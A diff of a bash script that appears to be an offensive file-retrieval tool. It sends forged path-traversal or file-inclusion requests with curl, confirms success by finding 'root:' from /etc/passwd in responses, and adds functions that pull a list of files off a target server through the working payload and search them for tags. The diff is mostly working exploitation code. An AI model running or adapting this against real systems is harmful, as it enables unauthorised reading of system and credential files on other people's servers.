@@ -10,8 +10,9 @@ function forgeRequest {
 	echo "$this_forged_request"
 	}
 function sendRequest {
+	#curl -f : don't chow pages if reponse different from "200 OK"
 	this_forged_request="$1"
-	curl -ks --connect-timeout "$curl_ttl" --retry-max-time "$curl_ttl" "$this_forged_request" -o "$curl_output_filename"
+	curl -ks -f --connect-timeout "$curl_ttl" --retry-max-time "$curl_ttl" "$this_forged_request" -o "$curl_output_filename"
 	}
 function checkResult {
 	this_check=$(cat "$curl_output_filename" 2>/dev/null | grep "root:")
@@ -39,12 +40,12 @@ function getFile {
 	this_dest_file="$3"
 	this_forged_request=$(forgeRequest "$this_filename" "$this_payloadtype" )
 	sendRequest "$this_forged_request" 
-	this_check_result=$(checkResult)
-	if [ $this_check_result = "OK" ];then
+	#this_check_result=$(checkResult)
+	#if [ $this_check_result = "OK" ];then
 		cat "$curl_output_filename" > "$this_dest_file"
 	#else
 		#echo -e "    |_[!] ERROR: Can't get file $this_filename!" >&2
-	fi
+	#fi
 	}
 function checkFile {
 	this_filename="$1"
@@ -62,6 +63,70 @@ function checkFile {
 		functionnal_payload=''
 	fi
 
+	}
+function downloadFiles {
+	#convert target domaine to folder
+	this_dl_sub_folder="$1"
+	showTitle "Downloading files into" "$download_folder/$this_dl_sub_folder/" "1"
+	total_files_downloaded=0
+	total_files_being_dl=0
+	for dl_file in ${download_files[*]};do
+		total_files_being_dl=$(( $total_files_being_dl+1 ))
+		#dl_filename=$(echo "$dl_file"|rev|cut -d '/' -f 1|rev)
+		dl_filename=$(echo "$dl_file"|sed 's/\//_/g'|sed 's/\.\./parent/g')
+		dl_dest="$download_folder/$this_dl_sub_folder/$dl_filename"
+		pct_dl=$(($total_files_being_dl*100/$total_files_to_dl))
+		showTitle "[Progress:$c_submain$pct_dl$c_reset$c_main%][downloaded:$c_submain$total_files_downloaded/$total_files_to_dl$c_reset$c_main] $dl_file" "" "2" "noNL"
+		getFile "$dl_file" "$functionnal_payload" "$dl_dest"
+		check_size=$(checkFileSize "$dl_dest")
+		
+		if [ "$check_size" != "OK" ];then
+			echo -e "$c_error$check_size$c_reset"
+			rm -f "$dl_dest"
+		else
+			total_files_downloaded=$(( $total_files_downloaded+1 ))
+			echo -e "$c_text$check_size$c_reset"
+		fi
+	done
+	}
+function listDownloadedFiles {
+	this_dl_sub_folder="$1"
+	#listing downloaded files
+	showTitle "Listing downloaded files" "" "1"
+	#ls -Al "$download_folder/$this_dl_sub_folder/"|tail -n +2|egrep -v "^[[space]]*"|sed "s/^/    | /g"
+	filelist=$(ls -A "$download_folder/$this_dl_sub_folder/")
+	for fl in $(echo "$filelist");do
+		showTitle "$fl" "" "2" ""
+		showTitle "Filesize" "$filesize" "3" "NoNL"
+		echo ""$(stat -c%s "$download_folder/$this_dl_sub_folder/$fl")" octets"
+		showTitle "Tag search" "" "3" ""
+		for tg in ${tags_checklist[*]};do
+			check_tag=$(cat "$download_folder/$this_dl_sub_folder/$fl" | grep -n "$tg")
+			if [ ${#check_tag} -gt 0 ];then 
+				showTitle "$tg tag" "$c_main" "4" "noNL"
+				#echo -e ""$(echo -e "$check_tag$c_text"|sed "s/^/\\\n${arbo[5]}${chips[5]}\\$c_text/g"|sed "s/  /#@§/g")|sed "s/#@§/  /g"
+				echo -e ""$(echo -e "$check_tag$c_text"|sed "s/^/\\\n${arbo[5]}${chips[5]}line \\$c_text/g"|sed "s/  /#@§/g")|sed "s/#@§/  /g"
+			fi
+		done
+	done
+	}
+function checkFolders {
+	this_folder="$download_folder"
+	this_subfolder="$1"
+	if [ ! -d "$download_folder" ];then 
+		showTitle "Creating" "$download_folder" "2" "NoNL"
+		mkdir "$download_folder" 
+		echo -e "Done"$c_reset
+	else
+		showTitle "Folder $download_folder" "Already exists" "2"
+	fi
+	if [ ! -d "$download_folder/$dl_sub_folder" ];then 
+		showTitle "Creating" "$download_folder/$dl_sub_folder" "2" "NoNL"
+		mkdir "$download_folder/$dl_sub_folder" 
+		echo -e "Done"$c_reset
+	else
+		showTitle "Folder $download_folder/$dl_sub_folder" "Already exists" "2"
+	fi
 	}
 function showTitle {
 	this_label="$1"
